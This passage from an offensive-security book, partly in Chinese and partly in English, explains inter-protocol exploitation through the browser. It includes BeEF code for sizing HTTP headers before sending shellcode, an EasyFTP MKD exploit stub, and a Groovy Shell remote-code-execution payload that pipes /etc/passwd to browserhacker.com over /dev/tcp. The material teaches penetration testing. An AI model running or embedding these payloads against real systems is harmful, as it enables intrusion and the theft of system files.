
```
form.setAttribute('action', target);

form.setAttribute('method', 'post');

form.setAttribute('enctype', 'text/plain');

var input = document.createElement('input');

input.setAttribute('id', 'data1')

input.setAttribute('name', 'data1')

input.setAttribute('type', 'hidden');

input.setAttribute('value', commands);

form.appendChild(input);

iframe.contentWindow.document.body.appendChild(form);

form.submit();
```

本例中使用的 IMAP 服务器是 Eudora，后文将用于演示协议间利用。如图 10-19 所示，当 IMAP 服务器收到 `POST` 请求时，HTTP 头部会被解析为无效命令（“不 recognized 或在当前状态下不合法”）。`POST` 主体中的 IMAP 命令被正确解析。在此示例中，认证尝试失败是因为我们不知道正确的凭据。

start figure

**Figure 10-19:** IPC 导致的 IMAP 服务器日志

![c10f019.eps](img/c10f019.png)

end figure

你可以在图 10-19 中看到，IMAP 服务器返回 “incorrect password”。在成功登录后，会返回不同的结果，需要加以区分。

一些 IMAP 服务器支持发送电子邮件，这可以用于创建侧信道。根据前文在非 HTTP 服务指纹识别部分的介绍，`timing differences` 也可以被利用，具体取决于实现。一旦登录，查看 `Inbox` 的内容通常比未认证的连接错误耗时更长。

前文列出的协议并非 IPC 兼容目标的完整列表。任何满足 IPC 条件（容错性和数据封装）的其他协议实现，都可能通过 IPC 进行交互。下次你在渗透测试中遇到新的潜在 IPC 目标时，请记住这些依赖关系。

### 实现协议间利用

前文讨论了协议间通信，但 Wade Alcorn 的研究并未在此停止。Alcorn 在 2007 年的研究论文中展示了 IPC 技术可以扩展到不仅实现通信，还能实现利用，从而得到协议间利用（Inter-protocol Exploitation，IPE）。这里讨论的某些主题涉及较低层的应用利用。如果你需要更多信息，请不要忘记查阅 `The Shellcoder Hacker’s Handbook 2nd Edition`。

如果你能够通过 HTTP 与非 HTTP 协议进行通信（如前一节所示），你发送的数据也可以包含 `Shellcode`。类似于 IPC，IPE 也依赖于容错性和数据封装。

让我们扩展之前用于讨论 IPC 的初始示例。假设一个服务寻找类似以下命令：

```
WRITE <content> <file_path>
```

假设处理 `<file_path>` 的代码因为未对 `<content>` 的长度进行检查，而使用 `memcpy` 将其复制到 1024 字节的缓冲区，导致缓冲区溢出。如果你在查找应用漏洞，可能会尝试对输入进行模糊测试，试图触发崩溃条件。当然，这个虚构的例子会崩溃。

当提交文件路径为 1500 字节的 `WRITE` 命令时，分析得到的段错误数据表明你可以控制 Extended Instruction Pointer（`EIP`），并且在内存中有 800 字节的空间用于放置 `Shellcode`。谁会想到？这个虚构的例子正好满足你对 IPE 的需求！

#### 计算 HTTP 头大小

当你发送包含 `Shellcode` 的 `POST` 请求时，往往需要非常精确。你需要指定返回地址应该指向的位置，以及需要多少个 `NOP`（以及其他垃圾字节）。即使 1 字节的误差也可能导致你试图攻击的监听服务崩溃。这可能导致 `Shellcode` 未能按预期执行，从而失败。

正如你所学到的，HTTP 头部在目标协议中会被丢弃。但这并不意味着它们不会被解析并加载到你正在向其发送数据的进程的内存中。在某些情况下，这意味着必须计入头部的大小。

验证 HTTP 头部是否存储在内存的最简便方法是向想要分析的进程附加调试器。正如下文在 IMAP 利用示例中讨论的，Eudora WorldMail 版本 6.1.21（及更早版本）在解析 `POST` 主体内容之前，会先将 HTTP 头部存储在内存中。

此外，你无法事先确定在发送跨源 `POST` 请求时使用的 HTTP 头部的精确大小。每个浏览器都不同，往往包含不同的 HTTP 头部。你的 `exploit` 必须可靠，否则 `Shellcode` 将无法执行，服务可能崩溃。

那么，如何解决这个问题？一种方法是提前确定浏览器提交的跨源请求的头部精确大小。`BeEF` 通过在独特端口上绑定套接字来模拟跨源情况，向该服务器发送相同的跨源请求。到达套接字的原始 HTTP 请求内容用于计算头部的精确大小。被钩住的浏览器可以随后获取跨源请求长度的 JSON 对象结果。负责计算头部大小并随后将结果返回给被钩住浏览器的代码如下：

```
# 确定跨域请求的 HTTP 头部的精确大小。
# 需要准确计算垃圾并防止错误。
# 完整 URL 为 <BeEF_server>/api/ipec/junk/<socket_name>

get '/junk/:name' do
  socket_name = params[:name]
  halt 401 if not BeEF::Filters.alphanums_only?(socket_name)
  socket_data = BeEF::Core::NetworkStack::Handlers::AssetHandler. \
                  instance.get_socket_data(socket_name)
  halt 404 if socket_data == nil

  if socket_data.include?("\r\n\r\n")
    result = Hash.new

    headers = socket_data.split("\r\n\r\n").first
    BeEF::Core::NetworkStack::Handlers::AssetHandler. \
      instance.unbind_socket(socket_name)
    print_info "[IPEC] Cross-origin XmlHttpRequest headers \
                size - received from bind socket [#{socket_name}]: \
                #{headers.size + 4} bytes."
    # CRLF -> 4 bytes
    result['size'] = headers.size + 4

    headers.split("\r\n").each do |line|
      if line.include?("Host")
        result['host'] = line.size + 2
      end
      if line.include?("Content-Type")
        result['contenttype'] = line.size + 2
      end
      if line.include?("Referer")
        result['referer'] = line.size + 2
      end
    end
    result.to_json
  else
    print_error "[IPEC] Looks like there is no CRLF  \
                 in the data received!"
    halt 404
  end
end
```

Armed with this information, `NOPs` (or any additional garbage sizes) can be reliably calculated on the fly by the hooked browser before sending its exploit payload to the vulnerable service. It is then easy enough to adjust the `Host`, `Content-Type` and `Referrer` headers that will likely be different, to send a cross-origin HTTP request. It will contain the `NOPs` and `Shellcode` sizes adjusted to the precision required to execute without error.

One of the issues discussed earlier is whether the service being exploited is storing the HTTP headers in the same buffer as where your `Shellcode` is landing. This can be particularly important for post-authentication exploits, as discussed in the next examples. You first need valid credentials to access the service, followed by the `Shellcode` to exploit the stack overflow vulnerability. For example, if you were to try to exploit a vulnerability within an `FTP` server’s implementation of the `MKD` command, you would first have to successfully authenticate to the `FTP` server.

Ty Miller and Michele Orrù presented research into BeEF’s Bind IPE capability at RuxCon 2012.37 Rodrigo Marcos and the SecForce crew extended this research further by successfully exploiting post-authentication vulnerabilities without needing to calculate the length of the HTTP headers first:38

```
var auth = 'USER anonymous\r\nPASS anonymous\r\n';

var payload = 'MKD \x89[…shellcode…]';

var body = auth + payload;
```

They ported an existing exploit for EasyFTP Server to an Inter-protocol Exploit that was submitted within an HTTP `POST` request body. The request body is generated in the preceding code.

Marcos and the SecForce crew discovered that, in this instance of IPE, the exact HTTP header size was not required. However, this is not always the case. It’s important to remember that depending on the exploit that you’re attempting, you may need a method to calculate the size of the HTTP headers before you submit your exploit payload. Considering this, in addition to error tolerance and data encapsulation, the other dependency that may need to be met to shift from IPC to IPE is the size of the submitted headers.

### Inter-protocol Exploitation Examples

Now that you have considered some requirements for IPE, let’s jump into the more practical Inter-protocol Exploits. The following sections will examine some protocols that can be exploited by sending requests from the browser.

#### Groovy Shell Inter-protocol Exploitation Example

A good example of an IPE attack can be demonstrated against the Groovy Shell Server.39 Groovy Shell Server is a daemonized version of the popular Groovy Shell, a command-line application that enables you to evaluate Groovy code on the fly. It is quite common in environments that rely on Groovy and Grails to speed up the classic development of Java applications using more agile methodologies. In May 2013, Brendan Coles discovered that not only was the Groovy Shell Server vulnerable to Remote Code Execution, but it also met the criteria for IPE. The custom protocol used by this tool is reachable on port 6789 by default, which is also advantageous because port banning does not prevent access to this port.

In this instance, RCE exploitation is easier than more complex overflows, because you don’t have to deal with memory allocation or Shellcode. Because the Groovy Shell accepts any kind of content on port 6789 (as a normal shell environment would do), IPE can be used. It’s just a matter of encapsulating the Groovy code into an HTTP `POST` request, as shown here:

```
var rhost = '192.168.0.100'; // Targeted host

var rport = '6789'; // Targeted port

// /dev/tcp is supported in most 

// Linux distributions (Debian, Ubuntu, etc..)

var cmd = 'cat /etc/passwd >/dev/tcp/browserhacker.com/8888';

// create the final payload using Groovy's

// "command".execute() method

var payload = "\r\ndiscard\r\nprintln '" + cmd + 

"'.execute().text\r\ngo\r\nexit\r\n";

// send the POST request

beef.dom.createIframeIpecForm(rhost, rport, "/", payload);
```

As you can see from the payload variable value, the command `cmd` gets executed in a similar way to how Java executes system commands. In Java, you would perform:

```
String cmd = "uname -ra";

Runtime.getRuntime().exec(cmd);
```

Although the Groovy language syntax simplifies this slightly, to perform the same task you would do the following:

```
def cmd = "uname -ra"

cmd.execute()
```
